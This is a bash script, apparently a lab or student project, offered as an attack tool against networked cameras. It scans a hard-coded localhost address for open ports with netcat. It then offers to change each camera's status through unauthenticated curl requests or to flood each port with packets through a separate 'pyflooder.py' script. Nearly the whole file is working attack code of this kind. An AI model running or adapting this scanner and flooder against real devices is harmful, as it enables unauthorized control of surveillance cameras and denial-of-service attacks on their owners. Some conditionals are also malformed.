#!/bin/bash


cat Welcome.ascii

defaultChoice="y"

read -p "Do you want to run a port scan for active ports to attack? (Y/n): " yesOrno
if [ "$yesOrno" == "Y" ] || [ "$yesOrno" == "y" ] || ["$yesOrNo" == ""]; then
    echo -ne "\nChecking for open ports"
else
    echo "Shutting down..."
    exit
fi

IP_ADDRESS="127.0.0.1"
PORT_START=1
PORT_END=10000

success_list=()


# Start the loop for displaying changing dots
dot_loop() {
    local counter=0

    while true; do
        case $counter in
            0) echo -n "." ;;
            1) echo -n ".." ;;
            2) echo -n "..." ;;
        esac

        counter=$(( (counter + 1) % 3 ))

        sleep 1  # Adjust sleep duration if needed
        echo -ne "\rChecking for open ports   \rChecking for open ports"  # Move cursor to beginning and overwrite dots
    done
}

# Run dot_loop function in the background
dot_loop &

# Save the process ID of the dot_loop function
dot_loop_pid=$!

# Your main task: Check for open ports
for ((port=$PORT_START; port<=$PORT_END; port++)); do
    nc -z -w 1 $IP_ADDRESS $port > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        success_list+=($port)
    fi
done

# Kill the dot_loop function once the main task completes
kill $dot_loop_pid > /dev/null 2>&1

echo -e "\n"  # Move to the next line after the loop finishes

echo "Ports found: ${success_list[@]}"

# Prompt user to remove ports
if [ ${#success_list[@]} -gt 0 ]; then
    read -p "Do you want to remove any ports? (Y/n): " decision
    if [ "$decision" == "Y" ] || [ "$decision" == "y" ] || ["$decision" == ""]; then
        read -p "Enter the port(s) you want to remove (space-separated): " ports_to_remove

        # Create an array from user input
        IFS=' ' read -ra remove_array <<< "$ports_to_remove"

        # Create a filtered list without the user-provided ports
        filtered_list=("${success_list[@]}")
        for port in "${remove_array[@]}"; do
            filtered_list=(${filtered_list[@]//$port/})
        done
        echo -e "\n"
    else
        echo -e "Inccorect input moving on...\n"
    fi
fi


shutdown=false

while [ "$shutdown" = false ]; do
    echo -e "What attack do you want to perform?"
    echo "1 to change status for each camera."
    echo "2 to perform (D)DoS attack against each camera."
    echo "3 to exit and dont perform an attack."
    read -p "> " what_attack

    if [ "$what_attack" == "1" ]; then
        if [ ${#filtered_list[@]} -eq 0 ]; then
            echo "Want to change status for each camera (1) or for then all at once (2)?"
            read -p "> " choice
            if [ "$choice" == "1" ]; then
                echo "Ports to choose from: ${success_list[@]}"
                read -p "Enter the camera port(s) you want to change status for (space-separated): " ports_to_change
                IFS=' ' read -ra change_status_for <<< "$ports_to_change"
                for port in "${change_status_for[@]}"; do
                    read -p "What do you want to set the camera on $port to? (Active/Inactive): " new_status
                    curl "http://$IP_ADDRESS:$port/set_status?new_status=$new_status"
                    echo -e "\n"
                done
            else
                read -p "What do you want to set all cameras status to? (Active/Inactive): " new_status
                for port in "${success_list[@]}"; do
                    curl "http://$IP_ADDRESS:$port/set_status?new_status=$new_status"
                    echo -e "\n"
                done
            fi
        else
            echo "Want to change status for each camera (1) or for then all at once (2)?"
            read -p "> " choice
            if [ "$choice" == "1" ]; then
                echo "Ports to choose from: ${filtered_list[@]}"
                read -p "Enter the camera port(s) you want to change status for (space-separated): " ports_to_change
                IFS=' ' read -ra change_status_for <<< "$ports_to_change"
                for port in "${change_status_for[@]}"; do
                    read -p "What do you want to set the camera on $port to? (Active/Inactive): " new_status
                    curl "http://$IP_ADDRESS:$port/set_status?new_status=$new_status"
                    echo -e "\n"
                done
            else
                read -p "What do you want to set all cameras status to? (Active/Inactive): " new_status
                for port in "${filtered_list[@]}"; do
                    curl "http://$IP_ADDRESS:$port/set_status?new_status=$new_status"
                    echo -e "\n"
                done
            fi
        fi
    elif [ "$what_attack" == "2" ]; then
        echo "How many packets do you want to send?"
        read -p "> " packets_input
        echo -e "\n"
        if [[ $packets_input =~ ^[0-9]+$ ]]; then
            packets=$((packets_input))
            if [ ${#filtered_list[@]} -eq 0 ]; then
                for port in "${success_list[@]}"; do
                    python3 pyflooder.py $IP_ADDRESS $port $packets
                done
            else
                for port in "${filtered_list[@]}"; do
                    python3 pyflooder.py $IP_ADDRESS $port $packets
                done
            fi
            echo -e "\n"
        else
            echo -e "Invalid input. Please enter a valid number next time.\n"
            
        fi
    elif [ "$what_attack" == "3" ]; then
        echo "Shutting down..."
        shutdown=true
    else
        echo -e "Incorrect choice. Please enter 1, 2 or 3 to exit.\n"
    fi
done
